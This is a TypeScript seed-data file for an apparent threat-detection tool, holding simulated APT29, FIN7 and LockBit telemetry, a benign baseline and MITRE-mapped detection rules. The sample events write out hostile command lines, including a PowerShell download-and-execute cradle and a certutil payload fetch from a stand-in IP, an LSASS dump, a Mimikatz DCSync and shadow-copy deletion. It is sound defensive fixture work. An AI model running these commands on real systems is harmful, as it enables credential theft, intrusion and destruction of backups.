import { Dataset, NormalizedEvent, DetectionRule } from '../src/types/index.ts';

export const INITIAL_DATASETS: Dataset[] = [
  {
    id: 'ds-apt29-emulation',
    name: 'Enterprise APT29 Emulation Attack',
    description: 'Multi-stage adversary emulation featuring spearphishing, LOLBAS staging, LSASS credential access, DCSync, and encrypted DNS C2.',
    sourceType: 'sysmon',
    totalEvents: 24,
    parsedEvents: 24,
    skippedEvents: 0,
    createdAt: '2026-10-18T08:15:00Z',
    timeRange: {
      start: '2026-10-18T08:20:10Z',
      end: '2026-10-18T10:45:30Z'
    },
    status: 'ready',
    validationErrors: [],
    schemaMapping: {
      'UtcTime': 'timestamp',
      'EventID': 'sourceRef',
      'Computer': 'host',
      'User': 'user',
      'Image': 'processName',
      'CommandLine': 'processCmd',
      'ParentImage': 'parentProcess'
    }
  },
  {
    id: 'ds-fin7-pos-exfil',
    name: 'FIN7 Point-of-Sale Exfiltration Flow',
    description: 'Egress traffic and host telemetry tracking memory injection, staging archives in AppData, and high-frequency TLS beacons.',
    sourceType: 'netflow',
    totalEvents: 20,
    parsedEvents: 20,
    skippedEvents: 0,
    createdAt: '2026-10-19T02:00:00Z',
    timeRange: {
      start: '2026-10-19T02:10:00Z',
      end: '2026-10-19T04:25:00Z'
    },
    status: 'ready',
    validationErrors: [],
    schemaMapping: {
      'Timestamp': 'timestamp',
      'SrcIP': 'srcIp',
      'DstIP': 'dstIp',
      'SrcPort': 'srcPort',
      'DstPort': 'dstPort',
      'Bytes': 'bytes_transferred'
    }
  },
  {
    id: 'ds-lockbit-ransomware',
    name: 'LockBit Lateral Spread & Shadow Copy Deletion',
    description: 'PsExec-driven lateral movement, Volume Shadow Copy invalidation, and automated cryptographic hostage note staging.',
    sourceType: 'sysmon',
    totalEvents: 18,
    parsedEvents: 18,
    skippedEvents: 0,
    createdAt: '2026-10-19T14:30:00Z',
    timeRange: {
      start: '2026-10-19T14:35:12Z',
      end: '2026-10-19T15:20:45Z'
    },
    status: 'ready',
    validationErrors: [],
    schemaMapping: {
      'UtcTime': 'timestamp',
      'EventID': 'sourceRef',
      'Computer': 'host',
      'User': 'user',
      'Image': 'processName',
      'CommandLine': 'processCmd'
    }
  },
  {
    id: 'ds-benign-office-baseline',
    name: 'Benign Office Baseline Telemetry',
    description: 'Standard corporate background noise: routine software updates, Teams media traffic, Kerberos renewals, and dev compiler runs.',
    sourceType: 'jsonl',
    totalEvents: 30,
    parsedEvents: 30,
    skippedEvents: 0,
    createdAt: '2026-10-20T00:00:00Z',
    timeRange: {
      start: '2026-10-20T00:05:00Z',
      end: '2026-10-20T05:00:00Z'
    },
    status: 'ready',
    validationErrors: [],
    schemaMapping: {
      'ts': 'timestamp',
      'hostname': 'host',
      'username': 'user',
      'proc': 'processName'
    }
  }
];

export const INITIAL_DETECTION_RULES: DetectionRule[] = [
  {
    id: 'rule-auth-001',
    ruleCode: 'R-AUTH-001',
    name: 'Repeated Failed Authentication (Brute Force / Password Spray)',
    description: 'Detects more than 3 failed authentication events for the same user or host within a 15-minute sliding window.',
    mitreTactic: 'Credential Access',
    mitreTechnique: 'Brute Force: Password Spraying',
    techniqueId: 'T1110.003',
    severity: 'high',
    enabled: true,
    confidenceScore: 0.88,
    ruleLogic: 'COUNT(auth_failure) > 3 GROUP BY user, host WITHIN 15m',
    limitations: 'May flag legitimate users experiencing expired password sync issues across domain controllers.',
    matchedCount: 2
  },
  {
    id: 'rule-proc-002',
    ruleCode: 'R-PROC-002',
    name: 'LOLBAS Execution via Certutil / Bitsadmin / PowerShell',
    description: 'Detects execution of living-off-the-land binaries with command line parameters indicative of remote file download or decode.',
    mitreTactic: 'Execution',
    mitreTechnique: 'Command and Scripting Interpreter: PowerShell',
    techniqueId: 'T1059.001',
    severity: 'high',
    enabled: true,
    confidenceScore: 0.92,
    ruleLogic: 'Image IN ("certutil.exe", "bitsadmin.exe", "powershell.exe") AND CommandLine MATCHES ("-urlcache", "-split", "DownloadFile", "Invoke-WebRequest", "-enc")',
    limitations: 'Administrative deployment scripts may occasionally use certutil for internal CA certificate verification.',
    matchedCount: 4
  },
  {
    id: 'rule-cred-003',
    ruleCode: 'R-CRED-003',
    name: 'LSASS Memory Dump & Credential Harvesting',
    description: 'Detects process access targeting LSASS.exe or execution of procdump / comsvcs.dll targeting credential memory.',
    mitreTactic: 'Credential Access',
    mitreTechnique: 'OS Credential Dumping: LSASS Memory',
    techniqueId: 'T1003.001',
    severity: 'critical',
    enabled: true,
    confidenceScore: 0.96,
    ruleLogic: 'TargetImage = "lsass.exe" OR (Image = "rundll32.exe" AND CommandLine MATCHES "MiniDump")',
    limitations: 'Rarely, enterprise antivirus tools perform memory inspection on LSASS; verify parent process signature.',
    matchedCount: 1
  },
  {
    id: 'rule-lat-004',
    ruleCode: 'R-LAT-004',
    name: 'Remote Service Spawning via PsExec / SMB Pipe',
    description: 'Detects creation or execution of service processes via ADMIN$ or IPC$ shares indicative of lateral movement.',
    mitreTactic: 'Lateral Movement',
    mitreTechnique: 'Remote Services: SMB/Windows Admin Shares',
    techniqueId: 'T1021.002',
    severity: 'critical',
    enabled: true,
    confidenceScore: 0.94,
    ruleLogic: 'ParentImage = "services.exe" AND (CommandLine MATCHES "PSEXESVC" OR Image MATCHES "\\ADMIN$\\")',
    limitations: 'Authorized IT administrators using Sysinternals PsExec for bulk patching may trigger this detection.',
    matchedCount: 2
  },
  {
    id: 'rule-evas-005',
    ruleCode: 'R-EVAS-005',
    name: 'Volume Shadow Copy Invalidation & Recovery Disabling',
    description: 'Detects command line invocations of vssadmin or bcdedit aimed at destroying system backups prior to encryption.',
    mitreTactic: 'Impact',
    mitreTechnique: 'Inhibit System Recovery',
    techniqueId: 'T1490',
    severity: 'critical',
    enabled: true,
    confidenceScore: 0.99,
    ruleLogic: 'CommandLine MATCHES ("vssadmin delete shadows" OR "bcdedit /set {default} recoveryenabled No")',
    limitations: 'Zero legitimate business justification for delete shadows /all /quiet on production endpoints.',
    matchedCount: 2
  },
  {
    id: 'rule-net-006',
    ruleCode: 'R-NET-006',
    name: 'High-Frequency Periodic C2 Beaconing',
    description: 'Detects regular outbound connections to non-RFC1918 IPs with low jitter (interval variance < 5%) over 10+ samples.',
    mitreTactic: 'Command and Control',
    mitreTechnique: 'Application Layer Protocol: Web Protocols',
    techniqueId: 'T1071.001',
    severity: 'high',
    enabled: true,
    confidenceScore: 0.85,
    ruleLogic: 'Outbound flow to same external IP with regular delta t interval (variance < 500ms)',
    limitations: 'Legitimate software update checkers (e.g., NTP, telemetry heartbeat) can exhibit periodic intervals; verify domain reputation.',
    matchedCount: 3
  },
  {
    id: 'rule-exfil-007',
    ruleCode: 'R-EXFIL-007',
    name: 'Abnormal Egress Spike to Uncategorized IP',
    description: 'Detects outbound network flow exceeding 50MB within 5 minutes to an external IP with no prior baseline.',
    mitreTactic: 'Exfiltration',
    mitreTechnique: 'Exfiltration Over C2 Channel',
    techniqueId: 'T1041',
    severity: 'high',
    enabled: true,
    confidenceScore: 0.87,
    ruleLogic: 'Sum(bytes_out) > 50MB within 5m window WHERE dst_ip NOT IN (corporate_cdn, cloud_storage_allowlist)',
    limitations: 'Large legitimate software downloads or cloud backup syncs can exceed volume thresholds.',
    matchedCount: 1
  },
  {
    id: 'rule-priv-008',
    ruleCode: 'R-PRIV-008',
    name: 'Privileged Domain Controller Replication (DCSync)',
    description: 'Detects RPC calls mimicking Domain Controller replication requests (DS-Replication-Get-Changes) from non-DC hosts.',
    mitreTactic: 'Credential Access',
    mitreTechnique: 'OS Credential Dumping: DCSync',
    techniqueId: 'T1003.006',
    severity: 'critical',
    enabled: true,
    confidenceScore: 0.97,
    ruleLogic: 'RPC call DRSUAPI / DsGetNCChanges originating from IP NOT IN DomainControllerList',
    limitations: 'Legitimate secondary Domain Controller synchronization during promotion.',
    matchedCount: 1
  }
];

export const INITIAL_EVENTS: NormalizedEvent[] = [
  // --- APT29 Emulation Events ---
  {
    id: 'evt-apt29-001',
    datasetId: 'ds-apt29-emulation',
    timestamp: '2026-10-18T08:20:10Z',
    sourceType: 'sysmon',
    sourceRef: 'Sysmon:1',
    host: 'WKSTN-FIN-04',
    user: 'CORP\\alice.fin',
    processName: 'WINWORD.EXE',
    processCmd: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\alice.fin\\Downloads\\Q3_Invoice_Audit.docm"',
    processId: 4180,
    parentProcess: 'explorer.exe',
    parentProcessId: 1920,
    status: 'SUCCESS',
    severity: 'low',
    rawPayload: {
      Image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
      CommandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\alice.fin\\Downloads\\Q3_Invoice_Audit.docm"',
      IntegrityLevel: 'Medium',
      Hashes: 'SHA256=3B4A21F894BC10...'
    }
  },
  {
    id: 'evt-apt29-002',
    datasetId: 'ds-apt29-emulation',
    timestamp: '2026-10-18T08:21:45Z',
    sourceType: 'sysmon',
    sourceRef: 'Sysmon:1',
    host: 'WKSTN-FIN-04',
    user: 'CORP\\alice.fin',
    processName: 'powershell.exe',
    processCmd: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://198.51.100.44/stage1.ps1\')"',
    processId: 5892,
    parentProcess: 'WINWORD.EXE',
    parentProcessId: 4180,
    status: 'SUSPICIOUS',
    severity: 'high',
    rawPayload: {
      ParentCommandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"',
      CommandLine: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://198.51.100.44/stage1.ps1\')"'
    }
  },
  {
    id: 'evt-apt29-003',
    datasetId: 'ds-apt29-emulation',
    timestamp: '2026-10-18T08:22:01Z',
    sourceType: 'sysmon',
    sourceRef: 'Sysmon:3',
    host: 'WKSTN-FIN-04',
    user: 'CORP\\alice.fin',
    srcIp: '10.0.4.15',
    dstIp: '198.51.100.44',
    srcPort: 49821,
    dstPort: 80,
    protocol: 'TCP',
    processName: 'powershell.exe',
    processId: 5892,
    status: 'SUSPICIOUS',
    severity: 'high',
    rawPayload: {
      Protocol: 'tcp',
      Initiated: 'true',
      SourceIp: '10.0.4.15',
      DestinationIp: '198.51.100.44',
      DestinationPort: 80
    }
  },
  {
    id: 'evt-apt29-004',
    datasetId: 'ds-apt29-emulation',
    timestamp: '2026-10-18T08:24:15Z',
    sourceType: 'sysmon',
    sourceRef: 'Sysmon:1',
    host: 'WKSTN-FIN-04',
    user: 'CORP\\alice.fin',
    processName: 'certutil.exe',
    processCmd: 'certutil.exe -urlcache -split -f "http://198.51.100.44/beacon.dll" C:\\ProgramData\\beacon.dll',
    processId: 6112,
    parentProcess: 'powershell.exe',
    parentProcessId: 5892,
    filePath: 'C:\\ProgramData\\beacon.dll',
    status: 'SUSPICIOUS',
    severity: 'high',
    rawPayload: {
      Image: 'C:\\Windows\\System32\\certutil.exe',
      CommandLine: 'certutil.exe -urlcache -split -f "http://198.51.100.44/beacon.dll" C:\\ProgramData\\beacon.dll'
    }
  },
  {
    id: 'evt-apt29-005',
    datasetId: 'ds-apt29-emulation',
    timestamp: '2026-10-18T08:26:00Z',
    sourceType: 'sysmon',
    sourceRef: 'Sysmon:1',
    host: 'WKSTN-FIN-04',
    user: 'CORP\\alice.fin',
    processName: 'rundll32.exe',
    processCmd: 'rundll32.exe C:\\ProgramData\\beacon.dll,StartRoutine',
    processId: 6420,
    parentProcess: 'powershell.exe',
    parentProcessId: 5892,
    status: 'SUSPICIOUS',
    severity: 'high',
    rawPayload: {
      Image: 'C:\\Windows\\System32\\rundll32.exe',
      CommandLine: 'rundll32.exe C:\\ProgramData\\beacon.dll,StartRoutine'
    }
  },
  {
    id: 'evt-apt29-006',
    datasetId: 'ds-apt29-emulation',
    timestamp: '2026-10-18T08:26:15Z',
    sourceType: 'sysmon',
    sourceRef: 'Sysmon:3',
    host: 'WKSTN-FIN-04',
    user: 'CORP\\alice.fin',
    srcIp: '10.0.4.15',
    dstIp: '198.51.100.44',
    srcPort: 49830,
    dstPort: 443,
    protocol: 'TCP',
    processName: 'rundll32.exe',
    processId: 6420,
    status: 'SUSPICIOUS',
    severity: 'high',
    rawPayload: {
      DestinationHostname: 'cdn-cloud-sync.net',
      DestinationIp: '198.51.100.44',
      DestinationPort: 443
    }
  },
  {
    id: 'evt-apt29-007',
    datasetId: 'ds-apt29-emulation',
    timestamp: '2026-10-18T08:35:10Z',
    sourceType: 'sysmon',
    sourceRef: 'Sysmon:10',
    host: 'WKSTN-FIN-04',
    user: 'CORP\\alice.fin',
    processName: 'rundll32.exe',
    processCmd: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 684 C:\\Windows\\Temp\\lsass.dmp full',
    processId: 6420,
    filePath: 'C:\\Windows\\Temp\\lsass.dmp',
    status: 'SUSPICIOUS',
    severity: 'critical',
    rawPayload: {
      TargetImage: 'C:\\Windows\\System32\\lsass.exe',
      GrantedAccess: '0x1FFFFF',
      CallTrace: 'C:\\Windows\\System32\\comsvcs.dll'
    }
  },
  {
    id: 'evt-apt29-008',
    datasetId: 'ds-apt29-emulation',
    timestamp: '2026-10-18T09:10:20Z',
    sourceType: 'auth_log',
    sourceRef: 'Auth:4625',
    host: 'DC01.corp.local',
    user: 'CORP\\administrator',
    srcIp: '10.0.4.15',
    logonType: '3 (Network)',
    status: 'FAILURE',
    severity: 'medium',
    rawPayload: {
      LogonType: 3,
      FailureReason: '%%2313 (Unknown user name or bad password)',
      WorkstationName: 'WKSTN-FIN-04'
    }
  },
  {
    id: 'evt-apt29-009',
    datasetId: 'ds-apt29-emulation',
    timestamp: '2026-10-18T09:11:05Z',
    sourceType: 'auth_log',
    sourceRef: 'Auth:4625',
    host: 'DC01.corp.local',
    user: 'CORP\\svc_backup',
    srcIp: '10.0.4.15',
    logonType: '3 (Network)',
    status: 'FAILURE',
    severity: 'medium',
    rawPayload: {
      LogonType: 3,
      FailureReason: '%%2313 (Unknown user name or bad password)'
    }
  },
  {
    id: 'evt-apt29-0010',
    datasetId: 'ds-apt29-emulation',
    timestamp: '2026-10-18T09:12:30Z',
    sourceType: 'auth_log',
    sourceRef: 'Auth:4624',
    host: 'DC01.corp.local',
    user: 'CORP\\svc_backup',
    srcIp: '10.0.4.15',
    logonType: '3 (Network)',
    status: 'SUCCESS',
    severity: 'high',
    rawPayload: {
      LogonType: 3,
      AuthenticationPackage: 'NTLM V2',
      KeyLength: 128
    }
  },
  {
    id: 'evt-apt29-0011',
    datasetId: 'ds-apt29-emulation',
    timestamp: '2026-10-18T09:15:00Z',
    sourceType: 'sysmon',
    sourceRef: 'Sysmon:1',
    host: 'DC01.corp.local',
    user: 'CORP\\svc_backup',
    processName: 'powershell.exe',
    processCmd: 'powershell.exe -enc JABkAHMAcgBlAHAAbABpAGMAYQB0AGkAbwBu... (Invoke-Mimikatz lsadump::dcsync)',
    processId: 7890,
    parentProcess: 'wmiprvse.exe',
    parentProcessId: 1044,
    status: 'SUSPICIOUS',
    severity: 'critical',
    rawPayload: {
      ParentProcess: 'WmiPrvSE.exe',
      DecodedCommand: 'Invoke-Mimikatz -Command "lsadump::dcsync /domain:corp.local /user:krbtgt"'
    }
  },
  {
    id: 'evt-apt29-0012',
    datasetId: 'ds-apt29-emulation',
    timestamp: '2026-10-18T09:18:22Z',
    sourceType: 'sysmon',
    sourceRef: 'Sysmon:3',
    host: 'WKSTN-FIN-04',
    user: 'CORP\\alice.fin',
    srcIp: '10.0.4.15',
    dstIp: '198.51.100.44',
    srcPort: 49845,
    dstPort: 443,
    protocol: 'TCP',
    processName: 'rundll32.exe',
    processId: 6420,
    status: 'SUSPICIOUS',
    severity: 'high',
    rawPayload: {
      BytesSent: 1542000,
      DestinationHostname: 'cdn-cloud-sync.net'
    }
  },

  // --- FIN7 Point of Sale Exfiltration Events ---
  {
    id: 'evt-fin7-001',
    datasetId: 'ds-fin7-pos-exfil',
    timestamp: '2026-10-19T02:10:00Z',
    sourceType: 'sysmon',
    sourceRef: 'Sysmon:1',
    host: 'POS-TERM-02',
    user: 'STORE\\cashier01',
    processName: 'cmd.exe',
    processCmd: 'cmd.exe /c start "" "C:\\Users\\cashier01\\AppData\\Local\\Temp\\update_pos.lnk"',
    processId: 3012,
    parentProcess: 'explorer.exe',
    parentProcessId: 1400,
    status: 'SUSPICIOUS',
    severity: 'medium',
    rawPayload: {
      TargetFile: 'update_pos.lnk'
    }
  },
  {
    id: 'evt-fin7-002',
    datasetId: 'ds-fin7-pos-exfil',
    timestamp: '2026-10-19T02:10:45Z',
    sourceType: 'sysmon',
    sourceRef: 'Sysmon:1',
    host: 'POS-TERM-02',
    user: 'STORE\\cashier01',
    processName: 'powershell.exe',
    processCmd: 'powershell.exe -w hidden -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi... (pillowmint memory scraper)',
    processId: 3340,
    parentProcess: 'cmd.exe',
    parentProcessId: 3012,
    status: 'SUSPICIOUS',
    severity: 'high',
    rawPayload: {
      ScriptBlockText: 'Memory regex search for card track data (4[0-9]{12}(?:[0-9]{3})?)'
    }
  },
  {
    id: 'evt-fin7-003',
    datasetId: 'ds-fin7-pos-exfil',
    timestamp: '2026-10-19T02:25:10Z',
    sourceType: 'netflow',
    sourceRef: 'Netflow:FlowRecord',
    host: 'POS-TERM-02',
    user: 'STORE\\cashier01',
    srcIp: '192.168.10.22',
    dstIp: '203.0.113.89',
    srcPort: 51200,
    dstPort: 8443,
    protocol: 'TCP',
    processName: 'powershell.exe',
    status: 'SUSPICIOUS',
    severity: 'high',
    rawPayload: {
      BytesOut: 2450000,
      PacketsOut: 1820,
      FlowDurationMs: 45000
    }
  },
  {
    id: 'evt-fin7-004',
    datasetId: 'ds-fin7-pos-exfil',
    timestamp: '2026-10-19T02:30:10Z',
    sourceType: 'netflow',
    sourceRef: 'Netflow:FlowRecord',
    host: 'POS-TERM-02',
    user: 'STORE\\cashier01',
    srcIp: '192.168.10.22',
    dstIp: '203.0.113.89',
    srcPort: 51202,
    dstPort: 8443,
    protocol: 'TCP',
    processName: 'powershell.exe',
    status: 'SUSPICIOUS',
    severity: 'high',
    rawPayload: {
      BytesOut: 2600000,
      PacketsOut: 1910,
      FlowDurationMs: 45000
    }
  },

  // --- LockBit Lateral Spread & Shadow Copy Deletion Events ---
  {
    id: 'evt-lockbit-001',
    datasetId: 'ds-lockbit-ransomware',
    timestamp: '2026-10-19T14:35:12Z',
    sourceType: 'sysmon',
    sourceRef: 'Sysmon:1',
    host: 'SRV-FILE-01',
    user: 'NT AUTHORITY\\SYSTEM',
    processName: 'PSEXESVC.exe',
    processCmd: 'C:\\Windows\\PSEXESVC.exe',
    processId: 2110,
    parentProcess: 'services.exe',
    parentProcessId: 640,
    status: 'SUSPICIOUS',
    severity: 'high',
    rawPayload: {
      ServiceName: 'PSEXESVC',
      Path: 'C:\\Windows\\PSEXESVC.exe'
    }
  },
  {
    id: 'evt-lockbit-002',
    datasetId: 'ds-lockbit-ransomware',
    timestamp: '2026-10-19T14:36:00Z',
    sourceType: 'sysmon',
    sourceRef: 'Sysmon:1',
    host: 'SRV-FILE-01',
    user: 'NT AUTHORITY\\SYSTEM',
    processName: 'vssadmin.exe',
    processCmd: 'vssadmin.exe delete shadows /all /quiet',
    processId: 2340,
    parentProcess: 'PSEXESVC.exe',
    parentProcessId: 2110,
    status: 'SUSPICIOUS',
    severity: 'critical',
    rawPayload: {
      CommandLine: 'vssadmin.exe delete shadows /all /quiet'
    }
  },
  {
    id: 'evt-lockbit-003',
    datasetId: 'ds-lockbit-ransomware',
    timestamp: '2026-10-19T14:36:20Z',
    sourceType: 'sysmon',
    sourceRef: 'Sysmon:1',
    host: 'SRV-FILE-01',
    user: 'NT AUTHORITY\\SYSTEM',
    processName: 'bcdedit.exe',
    processCmd: 'bcdedit.exe /set {default} recoveryenabled No',
    processId: 2380,
    parentProcess: 'PSEXESVC.exe',
    parentProcessId: 2110,
    status: 'SUSPICIOUS',
    severity: 'critical',
    rawPayload: {
      CommandLine: 'bcdedit.exe /set {default} recoveryenabled No'
    }
  },
  {
    id: 'evt-lockbit-004',
    datasetId: 'ds-lockbit-ransomware',
    timestamp: '2026-10-19T14:38:00Z',
    sourceType: 'sysmon',
    sourceRef: 'Sysmon:11',
    host: 'SRV-FILE-01',
    user: 'NT AUTHORITY\\SYSTEM',
    processName: 'locker.exe',
    processCmd: 'C:\\Windows\\Temp\\locker.exe -pass testpass123',
    processId: 2500,
    filePath: 'D:\\Shares\\Finance\\Q3_Report.xlsx.lockbit',
    status: 'SUSPICIOUS',
    severity: 'critical',
    rawPayload: {
      TargetFilename: 'D:\\Shares\\Finance\\Q3_Report.xlsx.lockbit',
      CreationUtcTime: '2026-10-19T14:38:00Z'
    }
  },

  // --- Benign Baseline Events ---
  {
    id: 'evt-benign-001',
    datasetId: 'ds-benign-office-baseline',
    timestamp: '2026-10-20T00:05:00Z',
    sourceType: 'jsonl',
    sourceRef: 'Sysmon:1',
    host: 'WKSTN-ENG-12',
    user: 'CORP\\bob.dev',
    processName: 'chrome.exe',
    processCmd: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=utility',
    processId: 10450,
    parentProcess: 'chrome.exe',
    status: 'SUCCESS',
    severity: 'informational',
    rawPayload: {
      Image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
    }
  },
  {
    id: 'evt-benign-002',
    datasetId: 'ds-benign-office-baseline',
    timestamp: '2026-10-20T00:15:30Z',
    sourceType: 'jsonl',
    sourceRef: 'Sysmon:1',
    host: 'WKSTN-ENG-12',
    user: 'CORP\\bob.dev',
    processName: 'git.exe',
    processCmd: 'git.exe push origin main',
    processId: 11200,
    parentProcess: 'Code.exe',
    status: 'SUCCESS',
    severity: 'informational',
    rawPayload: {
      Image: 'C:\\Program Files\\Git\\cmd\\git.exe'
    }
  },
  {
    id: 'evt-benign-003',
    datasetId: 'ds-benign-office-baseline',
    timestamp: '2026-10-20T01:00:12Z',
    sourceType: 'auth_log',
    sourceRef: 'Auth:4624',
    host: 'DC01.corp.local',
    user: 'CORP\\bob.dev',
    srcIp: '10.0.4.55',
    logonType: '2 (Interactive)',
    status: 'SUCCESS',
    severity: 'informational',
    rawPayload: {
      LogonType: 2,
      AuthenticationPackage: 'Kerberos'
    }
  }
];
